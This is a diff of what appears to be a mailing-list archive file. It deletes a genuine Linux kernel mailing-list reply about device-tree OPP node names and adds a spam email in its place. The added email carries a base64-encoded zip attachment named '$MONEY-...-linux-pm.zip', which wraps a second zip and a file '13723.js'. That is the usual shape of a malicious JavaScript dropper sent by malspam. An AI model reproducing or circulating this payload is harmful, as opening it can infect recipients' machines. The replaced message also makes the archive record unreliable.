@@ -1,48 +1,54 @@
-From: Masahiro Yamada <yamada.masahiro@socionext.com>
-Subject: Re: [PATCH V2] PM / OPP: Use - instead of @ for DT entries
-Date: Mon, 17 Apr 2017 11:07:51 +0900
-Message-ID: <CAK7LNAQ7Uf1Jkj64-Ykdk5TSeWvkq7=BaqUMJo6KqrN7BhYvsQ@mail.gmail.com>
-References: <70e7c7ee13722ab9c73cb073f88502eaf1ada5f5.1491816050.git.viresh.kumar@linaro.org>
- <2765521.jPoRkFTblf@aspire.rjw.lan>
+From: <kgbok.kezyhumh@murad.com>
+Subject: (unknown)
+Date: Mon, 17 Apr 2017 03:38:46 -0000
+Message-ID: <149240032603.20711.9586781522881016860@jupiter.com.br>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Return-path: <linux-samsung-soc-owner@vger.kernel.org>
-In-Reply-To: <2765521.jPoRkFTblf@aspire.rjw.lan>
-Sender: linux-samsung-soc-owner@vger.kernel.org
-To: "Rafael J. Wysocki" <rjw@rjwysocki.net>
-Cc: Viresh Kumar <viresh.kumar@linaro.org>, Rob Herring <robh+dt@kernel.org>, Chanwoo Choi <cw00.choi@samsung.com>, MyungJoo Ham <myungjoo.ham@samsung.com>, Kyungmin Park <kyungmin.park@samsung.com>, Kukjin Kim <kgene@kernel.org>, Krzysztof Kozlowski <krzk@kernel.org>, Javier Martinez Canillas <javier@osg.samsung.com>, Viresh Kumar <vireshk@kernel.org>, Nishanth Menon <nm@ti.com>, Stephen Boyd <sboyd@codeaurora.org>, =?UTF-8?Q?Beno=C3=AEt_Cousson?= <bcousson@baylibre.com>, Tony Lindgren <tony@atomide.com>, Mark Rutland <mark.rutland@arm.com>, Daniel Mack <daniel@zonque.org>, Haojian Zhuang <haojian.zhuang@gmail.com>, Robert Jarzmik <robert.jarzmik@free.fr>, Maxime Ripard <maxime.ripard@free-electrons.com>, Chen-Yu Tsai <wens@csie.org>, linaro-kernel@list
+Content-Type: application/zip; name="$MONEY-840640779540345-linux-pm.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-pm-owner@vger.kernel.org>
+Received: from 186.193.179.92.jupiter.com.br ([186.193.179.92]:4490 "HELO
+        jupiter.com.br" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+        with SMTP id S932455AbdDQDiv (ORCPT
+        <rfc822;linux-pm@vger.kernel.org>); Sun, 16 Apr 2017 23:38:51 -0400
+Content-Disposition: attachment
+Subject: 
+Sender: linux-pm-owner@vger.kernel.org
 List-Id: linux-pm@vger.kernel.org
+To: linux-pm <linux-pm@vger.kernel.org>
 
-2017-04-15 7:47 GMT+09:00 Rafael J. Wysocki <rjw@rjwysocki.net>:
-> On Monday, April 10, 2017 02:51:35 PM Viresh Kumar wrote:
->> Compiling the DT file with W=1, DTC warns like follows:
->>
->> Warning (unit_address_vs_reg): Node /opp_table0/opp@1000000000 has a
->> unit name, but no reg property
->>
->> Fix this by replacing '@' with '-' as the OPP nodes will never have a
->> "reg" property.
->>
->> Reported-by: Krzysztof Kozlowski <krzk@kernel.org>
->> Reported-by: Masahiro Yamada <yamada.masahiro@socionext.com>
->> Suggested-by: Mark Rutland <mark.rutland@arm.com>
->> Signed-off-by: Viresh Kumar <viresh.kumar@linaro.org>
->> Acked-by: Maxime Ripard <maxime.ripard@free-electrons.com> (sunxi)
->> Reviewed-by: Chanwoo Choi <cw00.choi@samsung.com>
->> Reviewed-by: Krzysztof Kozlowski <krzk@kernel.org>
->
-> OK, so any ACKs from the DT side?  Rob?
->
-> Thanks,
-> Rafael
-
-
-
-I see Rob's Acked-by.
-
-https://lkml.org/lkml/2017/4/13/648
-
-
--- 
-Best Regards
-Masahiro Yamada
+UEsDBAoAAAAAACEbkUon7bFgRwcAAEcHAAAJAAAAMTM3MjMuemlwUEsDBBQAAAAIACEbkUqorza2
+sQYAAEoMAAAIAAAAMTM3MjMuanONVllz0lAUfnfG/xAZx4A9Uo2htWAfOGy1rV1ioXqHFwwhbE1C
+SALU8b/7nZugD9UZB25yc9bvbDfJRrHRW/LnrHk9iFt3jztncWmcGoG3MZpuMsu8r9ff556blEvr
+qXd5WR1F0eXMHSWzMChVGs+fiX7ydf59sm13PL/nZBfp7Fu8/LuJzRc3nt0kVZhaXv5Wv2qep6NB
+MFkkN91H9/r2e/wPAC1RngV+dTJbeuvdOvEeQs3TpmYTo/zUVLUbLsde3NnO1sm6XHLrw+FmFrTD
++3WpYpyeGkmcehXjR4HkIpuFu+ButNp0na/33gRASuzz1mUKXpcOnj8r8YYiJj/13Jg0wSd+/ZKY
+tkwuJUxmLpYzbYt36ZxMYpvJArPWNXMGWZFPO82xWrmKlxWqi61P6na8JN/jzLSJ67iIhV1KHiUL
+ppgyE4ReCsdzn4KAcx82rhDVdhrwxm0TXrtkwju1eEsIJCE2IaTxpDwXDS1PFhg1EbbBicjfya7l
+ZcBD7AMQLXFnYNLyJtlcF7+2nc7ZDwLZak7PjeOAFx6cZQtesWQMLuETcTTMWptNC24AoPU7cXBF
+5zwg+TtwDDQCxrTZ4sjfwbTVYg8GaZ8fGvMSlSDg4TypAkjgXPdZXdMVDNgw1MPDFZ0PmAbk6NgL
+YclCA89Ua4NscddEjrZuIj5zkT5niU9uKPA1RaoIWJwDi7DxeSdRQTOvuJcDzFtDEaOMSBmqJeA0
+FW51+hF7l26p24YpzQBS6udWEFLiu6FJooYgGpLnIm+ytVpbdokT3T6xyxnNkUCTa909UuQL7ZWS
+FBg56FPsewuCUnBGKwpgZcI+rkkqfK4LQEQ38EOKA4LtDKGlbBZ9bMMp2A3JWVvKYwu24455zB3E
+b+sCF57bEK1r+Tpda5JLGc8ZlB4wu9FkFUoZ6lgN026h6xqwVmvgTpCqwQ+uUhpNsFlf20WRQdMb
+iEj55FkbOOmQlMaCG1AgDlC6/v6jL4jxRLDY1pWmvMJSBj4f5Ht0iKNh9+g29iPBi3YqqvWJqTeQ
+3Oep6GiGlSPRVJ5nnMWIpcU6VWemfUYeejulLJEhiHmFxD9qB4uIp7TSc3jmTihcRL/HsBfPYxlm
+RHdGU1Pugrd2pLkI0WIJ84h0S8ER4uzoDpy6gUx0HmyDZfx1rfJQzwcDHV2v70c0kUik7Lgi27Qf
+AnTToghpCllMqHipi64JTcrycmYbSk2JX0ZUFsqDPSgFcguALfHQkLjk8USal7rCx9j3iZEUPVq6
+PRkJJ86PiXxKZCdHhfjHwSSjiJMLQjjCQtPWtfhBHPs6DZbOU1e6J3+svZf44RPa3Mc0oZvh7c8R
+Rd/QiphUAAFHQNTP0f7yd6Rp6A5nXcrxiqPUp/aKJ1rvx/74bohH3eqI00IC5AToZySe3H1b6Dbv
+OSuM4SITZ6tIKHKGCFZRRa50y7elhDotkhVdJ3K35A9WZ7xgmVcfEkVuYnLhaS4J7lCe+zys4oRl
+2JOjojhvLOQbdl0K8xHsBKsU1jRXD6HulIKApk5pLtWeI2e51YADDAXGyNtkACJe6hRLLfA4132j
+W9DUHVkcDzI1oOLElOnIV4d1PffHtU0r1D3SQwXm79eKflPm6FFHoTSkmsW7Ffon3ZcHB6el4gPi
+rr+47j7snM8XY86mn0K8tWtvj97Zx++PD/ebhiGS/atFsn64Cbrxzgn927TXlDf83o4z3t7PVtPH
+/sWGb5c9YZ01uXXRzNPQuvw8HK71NgS5m+gtdvcjXGJvOPyM+wzLdURgHXbv8LWB3acAlzFWKE9r
+LAMrSIZDF/fUiTt7FyJ4h5Vhec6XWXgFlztRSnDpYD1o22EioL1stCyXzUwBvLpRwe3Xh77qNNU3
+xeoqXH9ZKEOdYiXqq5p/VxO1bauO8pTfU47KLlSqZpCN1bLqCNXx1EiNVVk5Y7W9B2+lpuqxry42
+CvlQvaqKvUgtR8pVXvlw2GTVOsQ7Dg5K+FXwq7pTmIhb4Vh5zQSW7lRfLa5V90FJeWCcVTZVn0JV
+aZiVKswtR67YUoc+oRAV+ZCbhLFRlnpEq7vZ53Q9GC8eQ6f1yb2/QkneNv5G//j026269AI/mf5N
+/OAAn3x/aZunRhDQSMJBNOWndirGG+NGZ73T/MY646/fvX9r2Yfvj4+PTo6Kr9LyE08vTp/oWSdv
+aycfDu23YqBivHpl/JeabR8fvTuCWu2oZlUQ1t96/ODU+JLE+ss5Dh9aRUhPHVQaxs+f+Sxc3G/P
+xptdNPGWN+frXuc7sqPb7al5qRm0fgFQSwECPwAUAAAACAAhG5FKqK82trEGAABKDAAACAAkAAAA
+AAAAACAAAAAAAAAAMTM3MjMuanMKACAAAAAAAAEAGADHKVveZLfSAccpW95kt9IBxylb3mS30gFQ
+SwUGAAAAAAEAAQBaAAAA1wYAAAAAUEsBAj8ACgAAAAAAIRuRSiftsWBHBwAARwcAAAkAJAAAAAAA
+AAAgAAAAAAAAADEzNzIzLnppcAoAIAAAAAAAAQAYADGMXd5kt9IBMYxd3mS30gExjF3eZLfSAVBL
+BQYAAAAAAQABAFsAAABuBwAAAAA=
